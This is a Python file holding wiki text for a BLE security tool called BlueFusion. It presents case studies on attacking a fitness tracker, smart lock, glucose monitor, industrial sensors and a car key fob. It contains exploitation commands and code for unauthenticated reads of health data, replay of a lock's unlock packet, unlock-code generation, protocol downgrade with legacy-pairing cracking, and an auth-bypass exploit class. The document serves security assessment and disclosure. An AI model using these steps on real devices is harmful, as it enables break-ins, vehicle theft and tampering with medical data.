#!/usr/bin/env python3
"""
Practical BLE Hacking Examples wiki content
"""

CONTENT = """# Practical BLE Hacking Examples

## Real-World Case Studies and Techniques

This guide provides hands-on examples of BLE security analysis using BlueFusion, demonstrating how it simplifies complex tasks that traditionally required multiple tools and extensive manual analysis.

## Case Study 1: Smart Fitness Tracker Analysis

### Background
A popular fitness tracker uses BLE to sync data with a mobile app. We'll analyze its security posture and data handling.

### Traditional Approach (2-3 hours)
```bash
# Step 1: HCI logging setup on Android
# Manual UI navigation and developer options

# Step 2: Enumerate services with gatttool
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary
> characteristics

# Step 3: Capture with Ubertooth
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF

# Step 4: Manual analysis in Wireshark
# Apply filters, decode packets, correlate data
```

### BlueFusion Approach (15 minutes)
```bash
# Complete automated analysis
bluefusion analyze-device "FitTracker-XYZ" --comprehensive

# Output includes:
# - Complete service map
# - Data flow visualization  
# - Security vulnerabilities
# - Privacy concerns
```

### Findings
```python
# BlueFusion automatically discovered:
vulnerabilities = {
    "AUTH_BYPASS": {
        "severity": "HIGH",
        "description": "No authentication on health data characteristics",
        "handles": [0x0023, 0x0025, 0x0027],
        "poc": "bluefusion exploit --auth-bypass FitTracker-XYZ"
    },
    "DATA_LEAK": {
        "severity": "MEDIUM", 
        "description": "Personal data in advertisements",
        "data": "User ID and step count broadcast publicly",
        "fix": "Disable unnecessary advertisement data"
    }
}
```

### Exploitation Demo
```bash
# Read health data without authentication
bluefusion interact "FitTracker-XYZ" << EOF
read 0x0023  # Heart rate history
read 0x0025  # GPS coordinates
read 0x0027  # Sleep patterns
EOF

# Demonstrates complete access to sensitive health data
```

## Case Study 2: Smart Door Lock Penetration Test

### Objective
Assess the security of a residential smart lock system that uses BLE for proximity unlocking.

### Discovery Phase
```bash
# BlueFusion intelligent discovery
bluefusion discover --type smart-lock --duration 60

# Output:
# Found: SmartLock-9876 (AA:BB:CC:DD:EE:FF)
# Manufacturer: SecureHome Inc.
# Services: Lock Control, Battery, OTA Update
# Security: Legacy pairing (BLE 4.0)
```

### Security Analysis
```python
# Automated security audit
audit = bluefusion.security_audit("SmartLock-9876")

# Key findings:
print(audit.summary())
# 1. CRITICAL: Predictable unlock codes
# 2. HIGH: Replay attack vulnerability  
# 3. HIGH: No rolling codes implemented
# 4. MEDIUM: Battery level reveals presence
# 5. LOW: Debug service exposed
```

### Proof of Concept Attack
```bash
# Step 1: Capture legitimate unlock
bluefusion capture --device "SmartLock-9876" --trigger "wait-for-unlock"

# Step 2: Analyze unlock pattern
bluefusion analyze last-capture --focus "unlock-sequence"
# Discovered: Static 6-byte unlock code at handle 0x0042

# Step 3: Replay attack
bluefusion replay --packet-id 157 --device "SmartLock-9876"
# Result: Lock opened successfully

# Step 4: Generate unlock codes
bluefusion generate-codes --pattern "discovered-pattern" --count 10
```

### Responsible Disclosure Timeline
- Day 0: Vulnerability discovered
- Day 1: Vendor notified with BlueFusion report
- Day 30: Vendor acknowledged and began fix
- Day 90: Patch released via OTA
- Day 120: Public disclosure

## Case Study 3: Medical Device Security Assessment

### Context
Analyzing a Bluetooth-enabled glucose monitor for security vulnerabilities.

### Compliance Requirements
- HIPAA data protection
- FDA medical device guidelines
- Patient safety considerations

### BlueFusion Medical Mode
```bash
# Special mode for medical devices
bluefusion medical-mode --device "GlucoseMonitor-123" \\
  --compliance "HIPAA,FDA" \\
  --safety-checks enabled

# Ensures:
# - No interference with device operation
# - Audit trail for compliance
# - Patient data anonymization
```

### Analysis Results
```python
# Critical findings with patient impact
findings = {
    "PATIENT_ID_EXPOSURE": {
        "severity": "CRITICAL",
        "impact": "Patient medical record correlation",
        "details": "Device broadcasts patient ID in clear text",
        "remediation": "Implement ID randomization"
    },
    "MEASUREMENT_TAMPERING": {
        "severity": "CRITICAL",
        "impact": "False readings could affect treatment",
        "details": "No integrity checking on glucose values",
        "remediation": "Add cryptographic signatures"
    },
    "UNENCRYPTED_HISTORY": {
        "severity": "HIGH",
        "impact": "90 days of readings accessible",
        "details": "Historical data stored without encryption",
        "remediation": "Encrypt stored measurements"
    }
}
```

## Case Study 4: Industrial IoT Sensor Network

### Scenario
Manufacturing facility uses BLE sensors for equipment monitoring.

### Network Mapping
```bash
# Discover all sensors in facility
bluefusion map-network --type industrial --range extended

# Creates visual network topology
bluefusion visualize last-scan --format svg > network-map.svg
```

### Vulnerability Chain
```python
# BlueFusion discovered attack chain
attack_chain = [
    {
        "step": 1,
        "action": "Connect to any sensor",
        "vulnerability": "No authentication required"
    },
    {
        "step": 2,
        "action": "Read network credentials",
        "vulnerability": "Shared key in characteristic 0x0050"
    },
    {
        "step": 3,
        "action": "Impersonate sensor",
        "vulnerability": "No device verification"
    },
    {
        "step": 4,
        "action": "Inject false readings",
        "impact": "Production line disruption"
    }
]
```

### Automated Exploitation
```bash
# BlueFusion can demonstrate the full attack
bluefusion demo-attack --chain "industrial-sensor-takeover" \\
  --target "Sensor-001" \\
  --safe-mode  # Ensures no actual disruption
```

## Case Study 5: Automotive Key Fob Analysis

### Target
Modern vehicle with BLE-based passive entry system.

### Initial Reconnaissance
```bash
# Vehicle-specific analysis mode
bluefusion auto-mode --make "CarBrand" --model "ModelX" --year 2024

# Identifies:
# - Key fob protocols
# - Rolling code implementation
# - Proximity detection method
# - Relay attack susceptibility
```

### Relay Attack Testing
```python
# Test for relay attack vulnerability
relay_test = bluefusion.test_relay_attack(
    key_fob="KeyFob-ABC123",
    vehicle="Vehicle-VIN123",
    distance=50  # meters
)

if relay_test.vulnerable:
    print(f"Relay attack possible up to {relay_test.max_distance}m")
    print(f"Latency tolerance: {relay_test.latency_ms}ms")
```

### Cryptographic Analysis
```bash
# Analyze key fob crypto
bluefusion crypto-analyze --device "KeyFob-ABC123" \\
  --captures 1000 \\
  --look-for "weak-random,predictable-nonce,key-reuse"

# Results:
# ✓ Strong PRNG detected
# ✗ Nonce reuse after 65,535 uses
# ✓ No key reuse found
```

## Advanced Exploitation Techniques

### 1. GATT Fuzzing
```python
# Intelligent fuzzing based on characteristic properties
fuzzer = bluefusion.GATTFuzzer("target-device")
fuzzer.set_mode("smart")  # Uses ML to guide fuzzing
fuzzer.add_monitor("crash", "disconnect", "error_response")

results = fuzzer.run(duration=3600)
for crash in results.crashes:
    print(f"Crash at handle {crash.handle}: {crash.payload.hex()}")
```

### 2. Timing Attack Analysis
```bash
# Detect timing-based vulnerabilities
bluefusion timing-analysis --device "SecureDevice-123" \\
  --operation "pairing" \\
  --samples 1000

# Detects:
# - PIN verification timing leaks
# - Crypto operation timing variations
# - Authentication bypass opportunities
```

### 3. Protocol Downgrade Attacks
```python
# Force device to use weaker security
downgrade = bluefusion.ProtocolDowngrade("target-device")
downgrade.force_version("4.0")  # Force legacy pairing
downgrade.disable_secure_connections()

if downgrade.successful:
    # Now perform legacy attacks
    bluefusion.crack_legacy_pairing("target-device")
```

### 4. Cross-Protocol Attacks
```bash
# Analyze BLE/WiFi coexistence vulnerabilities
bluefusion cross-protocol --ble "device-1" --wifi "same-chip" \\
  --attacks "channel-jamming,packet-injection,timing-correlation"
```

## Defensive Testing Examples

### 1. Implementing Secure Services
```python
# Test your BLE service implementation
tester = bluefusion.SecurityTester()

# Add your service for testing
tester.add_service(
    uuid="1234-5678-9abc-def0",
    characteristics=[
        {"uuid": "char-1", "properties": ["read", "notify"], 
         "permissions": ["encryption", "authentication"]}
    ]
)

# Run comprehensive security tests
report = tester.run_all_tests()
print(report.get_recommendations())
```

### 2. Penetration Test Automation
```bash
# Automated pentest for production devices
bluefusion pentest --config pentest-config.yaml \\
  --output-format "json,pdf,html" \\
  --compliance "OWASP-IoT-Top-10"

# Config file specifies:
# - Target devices
# - Test categories
# - Risk tolerance
# - Reporting requirements
```

## Building Custom Exploits

### BlueFusion Exploit Framework
```python
from bluefusion.exploit import BLEExploit, Characteristic

class CustomExploit(BLEExploit):
    \"\"\"Example custom exploit for vulnerable device\"\"\"
    
    def __init__(self):
        super().__init__()
        self.name = "Custom Auth Bypass"
        self.cve = "CVE-2024-XXXXX"
        
    def check_vulnerable(self, device):
        \"\"\"Check if device is vulnerable\"\"\"
        # Connect and enumerate
        services = device.enumerate_services()
        
        # Look for vulnerable service
        vuln_service = services.get("12345678-1234-1234-1234-123456789abc")
        if vuln_service and not vuln_service.requires_auth:
            return True
        return False
    
    def exploit(self, device):
        \"\"\"Perform the exploit\"\"\"
        # Connect without pairing
        device.connect(skip_pairing=True)
        
        # Access protected characteristic
        secret = device.read_characteristic(0x0042)
        
        return {
            "success": True,
            "extracted_data": secret,
            "impact": "Complete authentication bypass"
        }

# Register and run exploit
bluefusion.register_exploit(CustomExploit())
bluefusion.run_exploit("Custom Auth Bypass", target="vulnerable-device")
```

## Lessons Learned

### Common Vulnerability Patterns

1. **Authentication Failures**
   - Missing authentication on sensitive characteristics
   - Predictable or static authentication tokens
   - Authentication bypass through service discovery

2. **Encryption Issues**
   - Relying on "security through obscurity"
   - Using legacy pairing when not necessary
   - Not enforcing encryption for sensitive data

3. **Implementation Flaws**
   - Improper input validation leading to crashes
   - Race conditions in connection handling
   - Memory leaks from malformed packets

4. **Design Weaknesses**
   - Broadcasting sensitive data in advertisements
   - Using static identifiers enabling tracking
   - Insufficient randomness in security tokens

### Best Practices for Developers

1. **Always Require Pairing**
   ```python
   # BlueFusion can verify this
   bluefusion verify --requirement "pairing-mandatory" device.yaml
   ```

2. **Use Secure Connections Only**
   ```python
   # Test that legacy pairing is rejected
   bluefusion test --no-legacy-pairing "MyDevice"
   ```

3. **Implement Proper Access Control**
   ```yaml
   # BlueFusion security policy file
   characteristics:
     - uuid: "health-data"
       permissions: ["encryption-required", "authentication-required"]
       access: ["paired-devices-only"]
   ```

4. **Regular Security Testing**
   ```bash
   # Add to CI/CD pipeline
   bluefusion ci-test --device-config device.yaml \\
     --security-baseline baseline.yaml \\
     --fail-on "high-severity"
   ```

## Conclusion

These practical examples demonstrate how BlueFusion transforms BLE security analysis from a complex, multi-tool process into an efficient, automated workflow. Key advantages include:

1. **Time Savings**: Tasks that took hours now complete in minutes
2. **Depth of Analysis**: Automated discovery of complex vulnerability chains
3. **Accessibility**: Security testing available to developers, not just experts
4. **Repeatability**: Consistent results across tests and teams
5. **Documentation**: Automatic report generation for compliance

Whether you're a security researcher, developer, or compliance officer, BlueFusion provides the tools needed to ensure BLE devices are secure by design and remain secure in deployment."""